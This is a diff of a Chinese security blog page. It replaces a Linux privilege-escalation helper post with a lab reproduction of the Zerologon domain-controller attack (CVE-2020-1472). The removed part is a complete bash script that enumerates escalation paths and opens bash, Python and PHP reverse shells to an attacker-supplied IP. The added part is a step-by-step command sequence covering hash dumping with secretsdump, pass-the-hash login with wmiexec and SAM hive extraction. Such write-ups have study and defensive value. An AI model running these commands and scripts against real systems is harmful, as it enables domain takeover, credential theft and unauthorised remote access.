@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Linux辅助提权 | 九世的博客</title>
-  <meta name="keywords" content=" Linux提权 ">
-  <meta name="description" content="Linux辅助提权 | 九世的博客">
+  <title>CVE-2020-1472复现 | 九世的博客</title>
+  <meta name="keywords" content=" 域渗透 ">
+  <meta name="description" content="CVE-2020-1472复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1466,9 +1466,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Linux辅助提权" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2020-1472复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Linux辅助提权</h1>
+        <h1 class="article-title">CVE-2020-1472复现</h1>
     
     <div class="article-meta">
         
@@ -1477,14 +1477,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Linux提权</a>
+            <a href="javascript:" class="color4">域渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-07-27 17:33:33">2019-07-27 17:08</time>
+        创建时间:<time class="date" title="更新时间: 2020-09-16 00:53:02">2020-09-16 00:39</time>
         
     </div>
     <div class="article-meta">
@@ -1506,7 +1506,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码"><span class="toc-text">代码</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响范围"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现过程"><span class="toc-text">漏洞复现过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1521,157 +1521,39 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593515&auto=1&height=66"></iframe>
+        <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
+<p>当攻击者使用Netlogon远程协议（MS-NRPC）建立与域控制器的易受攻击的Netlogon安全通道连接时，将存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络上的设备上运行特制的应用程序。<br>要利用此漏洞，将需要未经身份验证的攻击者使用MS-NRPC连接到域控制器以获得域管理员访问权限。</p>
+</blockquote>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows Server 2008 R2（用于基于x64的系统）Service Pack 1<br>Windows Server 2008 R2（用于基于x64的系统）Service Pack 1（服务器核心安装）<br>Windows Server 2012<br>Windows Server 2012（服务器核心安装）<br>Windows Server 2016<br>Windows Server 2016（服务器核心安装）<br>Windows Server 2019<br>Windows Server 2019（服务器核心安装）<br>Windows Server 1903版（服务器核心安装）<br>Windows Server版本1909（服务器核心安装）<br>Windows Server 2004版（服务器核心安装）</p>
+<p>缓解措施：暂无</p>
+<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><p>测试环境：windows server 2008和windows server 2012<br>测试结果:Windows server 2012失败（作者的windows server 2012 sp2可以成功）</p>
+<p>dcip:192.168.1.111(由于某些原因我改了一下ip后面到了192.168.1.107)<br>domain:demo.com</p>
+<p>使用给出的exp地址:<a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p>
+<pre><code>python zerologon_tester.py &lt;dcname&gt; &lt;dcip&gt;
+python zerologon_tester.py testing 192.168.1.111
+</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcnquF.png" alt=""></p>
+<p>使用scretsdump.py指定空hash或者-no-pass进行dcsync dump (我这里的no-pass并没有成功，不知道是不是这个exp的问题还是什么原因)</p>
+<pre><code>python secretsdump.py demo.com/&#39;TESTING -hashes aad3b435b51404eeaad3b435b51404ee:d42e7df83d64ed8c8e5630ce63cdeee0@192.168.1.107 -hashes aad3b435b51404eeaad3b435b51404ee:d42e7df83d64ed8c8e5630ce63cdeee0
+</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuugf.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/09/16/wcnx41.png" alt=""></p>
+<p>然后使用wmicexec连接到dc</p>
+<pre><code>wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f7fc88c760df9ce3d74657a5943e42e demo.com/administrator@192.168.1.107
+</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcu9gK.png" alt=""></p>
+<p>保存sam文件下载到本地</p>
+<pre><code>reg save hklm\sam c:\sam.hive
+reg save hklm\system c:\system.hive
+reg save hklm\security c:\security.hive
+</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuiuD.md.png" alt=""></p>
+<p>secretsdump解析sam（这里的MACHINE.ACC的hash是原来机器账户的hash）</p>
+<pre><code>python3 secretsdump.py -system system.hive -system system.hive -security security.hive LOCAL
+</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wcuZ4I.png" alt=""></p>
+<p>然后使用poc给出的restorepassword.py恢复hash（这里需要新版impacket我这里没有成，借一下文章的图）</p>
+<pre><code>python3 reinstall_original_pw.py testing 192.168.1.107 52bc2ea24e84d8faf163364510dd3b07b36c9c85a5846614328ccd3ff83e5ff825e3e0ae11759f1393ba10b572a480ee78272a341a2abb8b4ef65f1b754045d577543d70eac45b471d688e91dc4306a5bf0021d4d0dedaabdc866aeb260232fe85bc2319a47665e6a7cf10751e16a064ef79486d6fc86abeac64d86f5c91d8b5ba787194c082c16da99bbeca73ab323de5cc8a86ddd25d8f5e842c4ab8d4f8b304d920e9d2b3ffe43ff955173eb2451c915b712115d791560eb532cc4b30d093497a96b2941d2fbc8bc9a00fafb0a1b9b6bf466171937ee1f5e8c93fd17392ac897491b708ee934583c89d65ef6a97d1
+</code></pre><p><img src="https://s1.ax1x.com/2020/09/16/wculDg.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/09/16/wcu8Ej.png" alt=""></p>
+<p>参考链接:<br><a href="https://mp.weixin.qq.com/s?__biz=MzI2ODQwNTkxNw==&amp;mid=2247483702&amp;idx=1&amp;sn=263cb1377e79f3d6e11b57b96f5e3755" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2ODQwNTkxNw==&amp;mid=2247483702&amp;idx=1&amp;sn=263cb1377e79f3d6e11b57b96f5e3755</a></p>
+<p>exp我上传了仓库<br><a href="https://github.com/422926799/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/422926799/CVE-2020-1472</a></p>
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天整理链接并发公众号的时候发现了，一个辅助Linux提权的shell脚本。看了也行还行，那么我也写一个好了<br><img src="http://pic.netbian.com/uploads/allimg/190409/232118-1554823278d145.jpg" alt="232118-1554823278d145.jpg"></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="shell">#!/bin/bash
-
-echo &quot;A B C D E F G H I J K L N M&quot;
-jiet(){
-    echo &quot;是否查询执行[1]/[2]&quot;
-    read gsrc
-    if test $gsrc  -eq &quot;1&quot;
-    then
-        clear
-        runs
-    elif test ${#gsrc} -eq &quot;0&quot;
-    then
-        clear
-        runs
-
-    else
-        echo &quot;[!] 退出....&quot;
-        exit 0    
-    fi
-}
-
-fshell(){
-    echo &quot;[1]NC反弹shell&quot;
-    echo &quot;[2]python反弹shell&quot;
-    echo &quot;[3]PHP反弹shell&quot;
-    read input
-    if test $input -eq &quot;1&quot;
-    then
-        echo &quot;在攻击机执行nc -lvp 4444&quot;
-        echo &quot;输入攻击机的IP&quot;
-        read host
-        bash -i &gt;&amp; /dev/tcp/$host/4444 0&gt;&amp;1
-    elif test $input -eq &quot;2&quot;
-    then
-        echo &quot;在攻击机执行nc -lvp 4444&quot;
-        echo &quot;输入攻击机IP&quot;
-        read host
-        python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;$host&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;
-
-    elif test $input -eq &quot;3&quot;
-    then
-
-        echo &quot;在攻击机执行nc -lvp 4444&quot;
-        echo &quot;输入攻击机IP&quot;
-        read host
-        php -r &#39;$sock=fsockopen(&quot;&#39;$host&#39;&quot;,4444);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-    fi
-}
-
-runs(){
-    wen_array=(&quot;https://www.cnblogs.com/linuxsec/articles/6080882.html&quot; &quot;https://guif.re/linuxeop&quot; &quot;https://www.ddosi.com/l/&quot; &quot;https://github.com/SecWiki/linux-kernel-exploits--Linux提权exp下载&quot; &quot;https:/              /shenaniganslabs.io/2019/02/13/Dirty-Sock.html&quot; &quot;https://www.secquan.org/Discuss/1069715&quot; &quot;https://www.cnblogs.com/hookjoy/p/6612595.html&quot;)
-    echo &quot;[1] 查看系统基本架构和信息&quot;
-    echo &quot;[2] 本机IP查询&quot;
-    echo &quot;[3] 列出以root权限运行的进程&quot;
-    echo &quot;[4] 寻找系统里可以用的SUID文件&quot;
-    echo &quot;[5] 查看系统环境变量&quot;
-    echo &quot;[6] 查看/etc/passwd文件权限和/etc/shadow文件权限&quot;
-    echo &quot;[7] 计划任务&quot;
-    echo &quot;[8] 查看网络信息&quot;
-    echo &quot;[9] 一些不错的提权文章&quot;
-    echo &quot;[10] 反弹shell&quot;
-    echo &quot;[11] 退出&quot;
-
-    read sum
-    if test $sum -eq &quot;1&quot;
-    then
-        echo &quot;---系统版本信息---&quot;
-        uname -a
-        echo &quot;---系统架构---&quot;
-        lsb_release -a
-        echo &quot;---系统版本---&quot;
-        cat /proc/version
-        jiet
-    elif test $sum -eq &quot;2&quot;
-    then
-        echo &quot;---本机IP信息---&quot;
-        ifconfig
-        jiet
-    elif test $sum -eq &quot;3&quot;
-    then
-        echo &quot;---以root权限运行的进程---&quot;
-        ps -fu root
-        jiet
-    elif test $sum -eq &quot;4&quot;
-    then
-        echo &quot;---可用的SUID文件---&quot;
-        find / -perm -u=s -type f 2&gt;/dev/null
-        jiet    
-    elif test $sum -eq &quot;5&quot;
-    then
-        echo &quot;---PATH---&quot;
-        echo $PATH
-        jiet
-    elif test $sum -eq &quot;6&quot;
-    then
-        echo &quot;---passwd&amp;&amp;shadow&quot;
-        ls -l /etc | grep passwd
-        ls -l /etc | grep shadow
-        jiet
-    elif test $sum -eq &quot;7&quot;
-    then
-        echo &quot;---/etc内的计划任务---&quot;
-        ls -l /etc/cron*
-        jiet
-    elif test $sum -eq &quot;8&quot;
-    then
-        echo &quot;---网络信息---&quot;
-        netstat -antup
-        jiet
-
-    elif test $sum -eq &quot;9&quot;
-    then
-        echo &quot;---文章链接---&quot;
-        for((i=0;i&lt;${#wen_array[*]};i++)) do
-            echo ${wen_array[i]}
-        done
-        jiet
-    elif test $sum -eq &quot;10&quot;
-    then
-        echo &quot;---反弹shell---&quot;
-        fshell
-        jiet
-    elif test $sum -eq &quot;11&quot;
-    then
-        echo &quot;Bye&quot;
-        exit 0
-    fi
-}
-runs
-</code></pre>
-<p>运行例子<br><img src="https://s2.ax1x.com/2019/07/27/eMF3RA.png" alt="eMF3RA.png"></p>
-<p>查看基本信息<br><img src="https://s2.ax1x.com/2019/07/27/eMFYsP.png" alt="eMFYsP.png"></p>
-<p>本机IP查询<br><img src="https://s2.ax1x.com/2019/07/27/eMFdIg.png" alt="eMFdIg.png"></p>
-<p>以root权限运行的进程<br><img src="https://s2.ax1x.com/2019/07/27/eMFDRs.png" alt="eMFDRs.png"></p>
-<p>找出系统可用的SUID文件<br><img src="https://s2.ax1x.com/2019/07/27/eMFcLV.png" alt="eMFcLV.png"></p>
-<p>查看系统环境<br><img src="https://s2.ax1x.com/2019/07/27/eMFhi4.png" alt="eMFhi4.png"></p>
-<p>查看/etc/passwd和/etc/shadow的读取权限<br><img src="https://s2.ax1x.com/2019/07/27/eMF5W9.png" alt="eMF5W9.png"></p>
-<p>查看/etc内的计划任务<br><img src="https://s2.ax1x.com/2019/07/27/eMk478.png" alt="eMk478.png"></p>
-<p>查看网络信息<br><img src="https://s2.ax1x.com/2019/07/27/eMAW8J.png" alt="eMAW8J.png"></p>
-<p>一些提权的文章<br><img src="https://s2.ax1x.com/2019/07/27/eMAjxA.png" alt="eMAjxA.png"></p>
-<p>反弹shell<br><img src="https://s2.ax1x.com/2019/07/27/eMESqP.png" alt="eMESqP.png"></p>
-<p>反弹测试<br><img src="https://s2.ax1x.com/2019/07/27/eMEA2j.md.png" alt="eMEA2j.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/07/27/eMEExs.png" alt="eMEExs.png"></p>
-<p>使用帮助</p>
-<pre><code>wget https://raw.githubusercontent.com/422926799/note/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Linux%E6%8F%90%E6%9D%83/%E7%94%A8%E4%BA%8E%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83%E7%9A%84sh/rsh.sh
-chmod +x rsh.sh
-./rsh.sh
-</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1680,12 +1562,12 @@ chmod +x rsh.sh
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Linux辅助提权</p>
+    <p><span class="copy-title">文章标题:</span>CVE-2020-1472复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-27, 17:08:51</p>
-    <p><span class="copy-title">最后更新:</span>2019-07-27, 17:33:33</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b406cd6c.html" title="Linux辅助提权">http://422926799.github.io/posts/b406cd6c.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-09-16, 00:39:24</p>
+    <p><span class="copy-title">最后更新:</span>2020-09-16, 00:53:02</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b2a3f021.html" title="CVE-2020-1472复现">http://422926799.github.io/posts/b2a3f021.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
